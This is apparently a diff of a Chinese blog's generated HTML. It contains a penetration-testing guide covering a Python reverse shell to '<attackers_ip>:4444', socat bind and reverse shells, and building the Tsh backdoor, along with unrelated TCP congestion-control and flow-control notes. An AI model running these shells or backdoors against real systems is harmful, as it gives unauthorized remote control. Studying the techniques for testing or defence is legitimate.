 <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;\</span></span><br><span class="line"><span class="string">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\</span></span><br><span class="line"><span class="string">s.connect((&quot;&lt;attackers_ip&gt;&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);\</span></span><br><span class="line"><span class="string">os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="Socat"><a href="#Socat" class="headerlink" title="Socat"></a>Socat</h3><p>Netcat 的加强版！可是说实话，去检查这个<a href="http://www.dest-unreach.org/socat/">工具</a>的手册 <code>man socat</code>，你会惊奇你可以用这个工具做隧道化的工作。除此之外，它可以产生一个完全交互的 shell，甚至比前面提到的 python-pty 更好。缺点是你很可能将不得不在目标服务器上编译/安装这个工具，因为它不是大多数类 Unix 发行版中的默认工具。</p>
+<h3 id="Socat"><a href="#Socat" class="headerlink" title="Socat"></a>Socat</h3><p>Netcat 的加强版！可是说实话，去检查这个<a href="http://www.dest-unreach.org/socat/">工具</a>的手册 <code>man socat</code>，你会惊奇你可以用这个工具做隧道化的工作。除此之外，它可以产生一个完全交互的 shell，甚至比前面提到的 python-pty 更好。缺点是你很可能将不得不在目标服务器上编译&#x2F;安装这个工具，因为它不是大多数类 Unix 发行版中的默认工具。</p>
 <h4 id="绑定-shell"><a href="#绑定-shell" class="headerlink" title="绑定 shell"></a>绑定 shell</h4><p>设置监听器：</p>
 <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane</span><br></pre></td></tr></table></figure>
 
 <p>连接到监听器：</p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">socat FILE:`tty`,raw,<span class="built_in">echo</span>=0 TCP:&lt;victim_ip&gt;:1337</span><br></pre></td></tr></table></figure>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">socat FILE:`<span class="built_in">tty</span>`,raw,<span class="built_in">echo</span>=0 TCP:&lt;victim_ip&gt;:1337</span><br></pre></td></tr></table></figure>
 
 <h4 id="反向-shell"><a href="#反向-shell" class="headerlink" title="反向 shell"></a>反向 shell</h4><p>设置监听器：</p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,<span class="built_in">echo</span>=0</span><br></pre></td></tr></table></figure>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">socat TCP-LISTEN:1337,reuseaddr FILE:`<span class="built_in">tty</span>`,raw,<span class="built_in">echo</span>=0</span><br></pre></td></tr></table></figure>
 
 <p>连接到攻击者的机器：</p>
 <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">socat TCP4:&lt;attackers_ip&gt;:1337 EXEC:bash,pty,stderr,setsid,sigint,sane</span><br></pre></td></tr></table></figure>
 
 <h4 id="终端大小"><a href="#终端大小" class="headerlink" title="终端大小"></a>终端大小</h4><p>默认情况下，终端的大小是相当小的，当启动 <code>top</code> 命令或使用文本编辑器编辑文件时你可能会注意到。你可以很容易地改变这个，使用 <code>stty -a</code> 命令来获得你的常规终端的大小：</p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ stty -a</span><br><span class="line">speed 38400 baud; rows 57; columns 211; line = 0;</span><br></pre></td></tr></table></figure>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">stty</span> -a</span><br><span class="line">speed 38400 baud; rows 57; columns 211; line = 0;</span><br></pre></td></tr></table></figure>
 
 <p>将所需的尺寸应用到你的 socat 终端：</p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">stty rows 57 cols 211</span><br></pre></td></tr></table></figure>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">stty</span> rows 57 cols 211</span><br></pre></td></tr></table></figure>
 
 <h3 id="Tsh"><a href="#Tsh" class="headerlink" title="Tsh"></a>Tsh</h3><p><a href="https://github.com/creaktive/tsh">Tsh</a> 是一个小型的 ssh 式后门，带有完整的 pty 终端，并具有文件传输能力。这个工具的占用空间非常小，并且很容易在大多数类 Unix 系统上编译。从编辑 tsh.h 文件开始：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _TSH_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _TSH_H</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *secret = <span class="string">&quot;never say never say die&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SERVER_PORT 22</span></span><br><span class="line"><span class="keyword">short</span> <span class="keyword">int</span> server_port = SERVER_PORT;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">#define CONNECT_BACK_HOST  &quot;localhost&quot;</span></span><br><span class="line"><span class="comment">#define CONNECT_BACK_DELAY 30</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GET_FILE 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PUT_FILE 2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RUNSHELL 3</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* tsh.h */</span></span></span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _TSH_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _TSH_H</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *secret = <span class="string">&quot;never say never say die&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SERVER_PORT 22</span></span><br><span class="line"><span class="type">short</span> <span class="type">int</span> server_port = SERVER_PORT;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">#define CONNECT_BACK_HOST  &quot;localhost&quot;</span></span><br><span class="line"><span class="comment">#define CONNECT_BACK_DELAY 30</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_FILE 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PUT_FILE 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RUNSHELL 3</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* tsh.h */</span></span></span><br></pre></td></tr></table></figure>
 
 <p>更改 <code>secret</code>，指定 <code>SERVER_PORT</code>。如果你想反向连接，取消注释并编辑 <code>CONNECT_BACK_HOST</code> 和 <code>CONNECT_BACK_DELAY</code> 指令。运行 make：</p>
 <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ make linux_x64</span><br><span class="line">make								\</span><br><span class="line">	LDFLAGS=<span class="string">&quot; -Xlinker --no-as-needed -lutil&quot;</span>	\</span><br><span class="line">	DEFS=<span class="string">&quot; -DLINUX&quot;</span>					\</span><br><span class="line">	tsh tshd</span><br><span class="line">make[1]: Entering directory <span class="string">&#x27;/tmp/tsh&#x27;</span></span><br><span class="line">gcc -O3 -W -Wall -DLINUX -c pel.c</span><br><span class="line">gcc -O3 -W -Wall -DLINUX -c aes.c</span><br><span class="line">gcc -O3 -W -Wall -DLINUX -c sha1.c</span><br><span class="line">gcc -O3 -W -Wall -DLINUX -c tsh.c</span><br><span class="line">gcc -Xlinker --no-as-needed -lutil -o tsh pel.o aes.o sha1.o tsh.o</span><br><span class="line">strip tsh</span><br><span class="line">gcc -O3 -W -Wall -DLINUX -c tshd.c</span><br><span class="line">gcc -Xlinker --no-as-needed -lutil -o tshd pel.o aes.o sha1.o tshd.o</span><br><span class="line">strip tshd</span><br><span class="line">make[1]: Leaving directory <span class="string">&#x27;/tmp/tsh&#x27;</span></span><br></pre></td></tr></table></figure>
@@ -5252,7 +5254,7 @@
 <p>例如，TCP 向网络发送第一个报文段并等待一个确认；当该确认到达时，TCP 发送方将拥塞窗口增加 1 个 MSS，并发送出两个最大长度的报文段；这两个报文段被确认，则发送方对每个确认报文段将拥塞窗口增加 1 个 MSS，使得拥塞窗口变为 4 个 MSS，并这样下去。这一过程每过一个 RTT，发送速度就翻番。因此，TCP 发送速率起始慢，但在慢启动阶段以指数增长。</p>
 <p>这种指数增长不是无限的，慢启动在遇到以下 3 种情况之一时将结束：</p>
 <ul>
-<li>若存在一个由超时指示的丢包事件（即拥塞），TCP 发送方将另一个状态变量 ssthresh（“慢启动阈值”的速记）设为 cwnd/2，再将 cwnd 设为 1 并重新开始慢启动过程。</li>
+<li>若存在一个由超时指示的丢包事件（即拥塞），TCP 发送方将另一个状态变量 ssthresh（“慢启动阈值”的速记）设为 cwnd&#x2F;2，再将 cwnd 设为 1 并重新开始慢启动过程。</li>
 <li>当 cwnd 的值等于 ssthresh 时，结束慢启动并且 TCP 转移到拥塞避免模式。</li>
 <li>若检测到 3 个冗余 ACK，这时 TCP 执行一种快速重传并进入快速恢复状态。</li>
 </ul>
@@ -5268,7 +5270,7 @@
 <li>可选与变长的<strong>选项字段</strong>（options field）：该字段用于发送方与接收方协商最大报文段长度（MSS）时，或在高速网络环境下用作窗口调节因子时使用。首部字段中还定义了一个时间戳选项。</li>
 <li>6 比特的<strong>标志字段</strong>（flag field）：<strong>ACK</strong> 比特用于指示确认字段中的值是有效的，即该报文段包括一个对已被成功接收报文段的确认。<strong>RST</strong>、<strong>SYN</strong> 和 <strong>FIN</strong> 比特用于连接建立和拆除。在明确拥塞通告中使用了 <strong>CWR</strong> 和 <strong>ECE</strong> 比特。当 <strong>PSH</strong> 比特被置位时，就指示接收方应立即将数据交给上层。最后，<strong>URG</strong> 比特用来指示报文段里存在着被发送端的上层实体置为“紧急”的数据。紧急数据的最后一个字节由 16 比特的<strong>紧急数据指针字段</strong>（urgent data pointer field）指出。</li>
 </ul>
-<p>MSS 全称 Maximum Segment Size，即<strong>最大报文段长度</strong>，指 TCP 可从缓存中取出并放入报文段中的数据的最大数量。MSS 通常根据最初确定的由本地发送主机发送的最大链路层帧长度（即所谓的<strong>最大传输单元</strong>（Maximum Transmission Unit，MTU））来设置。设置该 MSS 要保证一个 TCP 报文段（当封装在一个 IP 数据报中）加上 TCP/IP 首部长度（通常 40 字节）将适合单个链路层帧。以太网和 PPP 链路层协议都具有 1500 字节的 MTU，因此 MSS 的典型值为 1460 字节。</p>
+<p>MSS 全称 Maximum Segment Size，即<strong>最大报文段长度</strong>，指 TCP 可从缓存中取出并放入报文段中的数据的最大数量。MSS 通常根据最初确定的由本地发送主机发送的最大链路层帧长度（即所谓的<strong>最大传输单元</strong>（Maximum Transmission Unit，MTU））来设置。设置该 MSS 要保证一个 TCP 报文段（当封装在一个 IP 数据报中）加上 TCP&#x2F;IP 首部长度（通常 40 字节）将适合单个链路层帧。以太网和 PPP 链路层协议都具有 1500 字节的 MTU，因此 MSS 的典型值为 1460 字节。</p>
 <h2 id="TCP-连接与状态"><a href="#TCP-连接与状态" class="headerlink" title="TCP 连接与状态"></a>TCP 连接与状态</h2><h3 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h3><p>客户端 TCP 会用以下方式与服务器端 TCP 建立一条 TCP 连接：</p>
 <ol>
 <li>客户端 TCP 首先向服务器端 TCP 发送一个 <strong>SYN 报文段</strong>。<br>该报文段不包含应用层数据，但是报文段的首部中的 SYN 标志位被置为 1，序号字段为一个随机的初始序号（不妨设为 <code>client_isn</code>）。<br>客户端 TCP 初始为 <strong>CLOSED</strong>（关闭）状态，发送此 SYN 报文段后，将进入 <strong>SYN_SENT</strong> 状态。</li>
@@ -5296,9 +5298,9 @@
 <p>由于 TCP 不允许已分配的缓存溢出，下式必须成立：</p>
 <p>$$LastByteRcvd-LastByteRead\leq RcvBuffer$$</p>
 <p>接收窗口用 rwnd 表示，根据缓存可用空间的数量来设置：</p>
-<p>$$rwnd = RcvBuffer-(LastByteRcvd-LastByteRead)$$</p>
+<p>$$rwnd &#x3D; RcvBuffer-(LastByteRcvd-LastByteRead)$$</p>
 <p>由于该空间是随着时间变化的，所以 rwnd 是动态的。</p>
-<p>主机 B 通过把当前的 rwnd 值放入它发给主机 A 的报文段接收窗口字段中，通知主机 A 它在该连接的缓存中还有多少可用空间。开始时，主机 B 设定 $rwnd = RcvBuffer$。注意到为了实现这一点，主机 B 必须跟踪几个与连接有关的变量。</p>
+<p>主机 B 通过把当前的 rwnd 值放入它发给主机 A 的报文段接收窗口字段中，通知主机 A 它在该连接的缓存中还有多少可用空间。开始时，主机 B 设定 $rwnd &#x3D; RcvBuffer$。注意到为了实现这一点，主机 B 必须跟踪几个与连接有关的变量。</p>
 <p>主机 A 轮流跟踪两个变量，LastByteSent 和 LastByteAcked，注意到这两个变量之间的差 $LastByteSent-LastByteAcked$，就是主机 A 发送到连接中但未被确认的数据量。通过将未被确认的数据量控制在值 rwnd 以内，就可以保证主机 A 不会使主机 B 的接收缓存溢出。因此，主机 A 在该连接的整个生命周期须保证：</p>
 <p>$$LastByteSent-LastByteAcked\leq rwnd$$</p>
 <p>特别的，TCP 规范中要求：当主机 B 的接收窗口为 0 时，主机 A 继续发送只有一个字节数据的报文段。</p>
